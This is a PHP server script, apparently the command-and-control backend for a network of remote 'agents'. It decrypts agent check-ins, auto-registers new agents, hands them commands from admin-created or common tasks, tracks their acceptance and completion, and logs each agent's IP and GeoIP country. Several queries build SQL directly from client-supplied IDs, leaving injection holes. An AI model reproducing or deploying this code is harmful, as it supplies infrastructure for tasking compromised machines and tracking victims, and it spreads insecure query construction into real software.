<?php
require_once(__DIR__ . "/lib.php");
const TASK_STATUS_CREATED = 0;
const TASK_STATUS_WAITING_ACCEPT = 1;
const TASK_STATUS_ACCEPTED = 2;
const TASK_STATUS_DONE = 3;
const TASK_COMMON = 1;
const TASK_PRIVATE = 0;


function handle($data)
{
    $config = include(__DIR__ . "/config.php");
    $clear_data = json_decode(decrypt($data, $config), true, 512, JSON_BIGINT_AS_STRING);
    if ($clear_data != NULL && checkParams($clear_data)) {
        if (isset($config["record_connection"]) && $config["record_connection"] === true) {
            if (!record_new_connection($config, $clear_data)) die;
        }
        switch ($clear_data["type"]) {
            case "GETJOB":
                return encrypt(
                    json_encode(getJob($config, $clear_data['appid'], $clear_data['time'], $clear_data['customField'])
                    ), $config);
            case "ACCEPTEDJOB":
                return encrypt(
                    json_encode(acceptJob($config, $clear_data['appid'], $clear_data['time'], $clear_data['customField'])
                    ), $config);
            case "DONEJOB":
                return encrypt(
                    json_encode(doneJob($config, $clear_data['appid'], $clear_data['time'], $clear_data['customField'])
                    ), $config);
            default:
                return false;
        }
    } else
        return false;
}

function getJob($config, $agent_id, $timestamp, $fields = null)
{
    $db = getDb($config);
    $task = find_free_tasks($db, $agent_id);
    if ($task === null)
        return [
            "result" => "DONE",
            "tasks" => "NOTASKS",
        ];
    else {
        return [
            "result" => "DONE",
            "tasks" => "HAVEJOB",
            "command" => $task["type"],
            "additional" => $task["additional"],

        ];
    }
}


function acceptJob($config, $appid, $timestamp, $fields = null)
{
    accept_current_task_for($appid, $config);
    return [
        "result" => "DONE",
    ];
}


function doneJob($config, $appid, $timestamp, $fields = null)
{
    $update = "SELECT * FROM task_agents where agent_id = {$appid} AND status = " . TASK_STATUS_ACCEPTED . ";";
    $db = getDb($config);
    /* @var $query PDOStatement */
    $query = $db->query($update);
    $fetched = $query->fetchAll(PDO::FETCH_ASSOC);

    if (count($fetched) > 0) {
        $task = $fetched[0];
        $update = "UPDATE task_agents SET status = " . TASK_STATUS_DONE . " WHERE agent_id = {$appid} AND task_id = {$task["task_id"]};";
        $db->exec($update);
    }
    return [
        "result" => "DONE",
    ];
}

function find_free_tasks($db, $agent_id)
{
    /** @var $db PDO */
    if (add_newbie($db, $agent_id)) {
        //common tasks
        return get_common_task($db, $agent_id);
    } else {
        $all_working_tasks_sql = "SELECT * FROM task_agents LEFT JOIN task ON `task`.`id` = `task_agents`.`task_id`
        WHERE agent_id = {$agent_id};";
        $all_working = $db->query($all_working_tasks_sql)->fetchAll(PDO::FETCH_ASSOC);
        if (count($all_working) == 0)
            return get_common_task($db, $agent_id);
        $task_to_do = null;
        $task_ids = [];
        foreach ($all_working as $task) {
            if ($task["status"] == TASK_STATUS_ACCEPTED || $task["status"] == TASK_STATUS_WAITING_ACCEPT)
                return $task; //он уже выполняет работу
            if ($task_to_do == null && $task["status"] == TASK_STATUS_CREATED) //This is custom tasks, created by admin
                $task_to_do = $task;
            $task_ids[] = $task["task_id"];
        }

        if ($task_to_do == null) {
            $sql = "SELECT * FROM task WHERE id NOT IN ( '" . implode("','", $task_ids) . "' ) AND is_common = " . TASK_COMMON;
            $rows = $db->query($sql, PDO::FETCH_ASSOC)->fetchAll();
            if (count($rows) == 0)
                return null;
            else {
                $task = $rows[0];
                $status = TASK_STATUS_WAITING_ACCEPT;
                $insert = "INSERT INTO task_agents (`task_id`,`agent_id`,`status`) VALUES ({$task['id']}, {$agent_id},{$status})";
                $db->exec($insert);
                return $task;
            }
        } else return $task_to_do;
    }
}

function get_common_task($db, $agent_id)
{
    $common_tasks = "SELECT * FROM task WHERE is_common = " . TASK_COMMON . ";";
    $tasks = $db->query($common_tasks)->fetchAll(PDO::FETCH_ASSOC);
    if ($tasks !== null && count($tasks) > 0) {
        $task = $tasks[0];
        $status = TASK_STATUS_WAITING_ACCEPT;
        $insert = "INSERT INTO task_agents (`task_id`,`agent_id`,`status`) VALUES ({$task['id']}, {$agent_id},{$status})";
        $db->exec($insert);
        return $task;
    } else return null;
}

function add_newbie($db, $agent_id)
{
    $select = "SELECT * FROM agent where id = {$agent_id};";
    /* @var $db PDO */
    $query = $db->query($select);
    if (count($query->fetchAll()) == 0) {
        $db->exec("INSERT INTO `agent` (`id`) VALUES ({$agent_id})");
        return true;
    } else return false;
}

function record_new_connection($config, $json)
{
    if (!(isset($_SERVER["REMOTE_ADDR"]) || isset($_SERVER["REMOTE_HOST"])))
        return false;
    $ip = $_SERVER['REMOTE_ADDR'];
    $sql = "INSERT INTO connections (appid,ip,country,`timestamp`) VALUES (:appid,:ip,:country,:timestamp)";
    $db = getDb($config);
    $ar = [
        ':appid' => intval($json["appid"]),
        ':ip' => $ip,
        ':country' => strval(geoip_country_name_by_name($ip)),
        ':timestamp' => intval($json["time"]),
    ];
    $s = $db->prepare($sql);
    return $s->execute($ar);
}

function accept_current_task_for($agent_id, $config)
{
    $db = getDb($config);
    $statement = $db->prepare("SELECT task_id FROM task_agents WHERE agent_id = :agent_id AND status = :status");
    $statement->execute([":agent_id" => $agent_id, ":status" => TASK_STATUS_WAITING_ACCEPT]);
    $task_id = $statement->fetchColumn(0);
    if ($task_id !== false && $task_id >= 1) {
        return $db->prepare("UPDATE task_agents SET `status` = :status WHERE `agent_id` = :agent_id AND task_id = :task_id;")
            ->execute([
                ":status" => TASK_STATUS_ACCEPTED,
                ":agent_id" => $agent_id,
                ":task_id" => $task_id,
            ]);
    } else return false;
}

function checkParams($d)
{
    //Дописать
    return isset($d["appid"]) && isset($d["time"]) && isset($d['type']);
    //&& is_long($d["appid"]) && is_long($d["time"]);
}

